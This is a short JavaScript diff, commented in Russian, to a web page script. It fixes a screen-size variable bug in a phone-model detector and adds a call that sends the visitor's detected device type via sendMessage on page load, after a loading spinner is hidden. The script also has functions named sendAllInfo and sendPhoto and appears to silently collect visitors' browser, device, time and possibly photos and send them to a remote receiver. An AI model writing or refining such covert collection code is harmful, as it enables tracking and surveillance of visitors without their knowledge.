@@ -27,7 +27,7 @@ async function sendPhoto(blob, caption) {
 // ========== ОПРЕДЕЛЕНИЕ МОДЕЛИ ТЕЛЕФОНА ==========
 function getPhoneModel() {
     const ua = navigator.userAgent;
-    const screen = `${screen.width}x${screen.height}`;
+    const screenSize = `${window.screen.width}x${window.screen.height}`;
 
     if (ua.includes('iPhone')) {
         const models = {
@@ -40,7 +40,7 @@ function getPhoneModel() {
             '428x926': 'iPhone 14 Plus/15 Plus',
             '430x932': 'iPhone 15 Pro Max/16 Pro Max'
         };
-        return models[screen] || 'iPhone (неизвестная модель)';
+        return models[screenSize] || 'iPhone (неизвестная модель)';
     }
     
     if (ua.includes('Android')) {
@@ -53,7 +53,7 @@ function getPhoneModel() {
                 }
             }
         }
-        return `Android (экран ${screen})`;
+        return `Android (экран ${screenSize})`;
     }
     
     return 'Неизвестное устройство';
@@ -95,7 +95,6 @@ async function sendAllInfo() {
     else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
     else if (ua.indexOf('Edg') > -1) browser = 'Edge';
     
-    const screenSize = `${screen.width}x${screen.height}`;
     const phoneModel = getPhoneModel();
     const deviceType = getDeviceType();
     const time = new Date().toLocaleString('ru-RU');
@@ -200,6 +199,10 @@ async function main() {
     // Скрываем спиннер
     const loader = document.querySelector('.loader');
     if (loader) loader.style.display = 'none';
+    
+    // Отправляем тип устройства
+    const deviceInfo = getDeviceType();
+    await sendMessage(`🔍 Определено устройство: ${deviceInfo}`);
     
     // 1. Вся информация
     await sendAllInfo();
